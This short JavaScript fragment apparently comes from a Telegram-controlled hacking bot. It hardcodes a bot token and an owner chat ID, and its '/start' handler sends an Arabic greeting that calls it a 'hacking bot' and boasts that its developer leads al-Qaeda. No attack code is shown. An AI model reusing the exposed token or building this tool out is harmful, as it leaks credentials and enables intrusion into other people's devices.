...
const token = '8551769992:AAHc1L3H2cnvK1oZlss4ih_YZBXCYA5PWl0'
const id = '8451720736'
...
appBot.on('message', (message) => {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت زعيم تنظيم القاعدة 𓅓𓆪𓆪 𖤛ᴠɪᴘ المطور : @WH_S8 مساعد @hblo318 عہٰلوشہٰ‏ يرحب بكم هنا\n\n' +
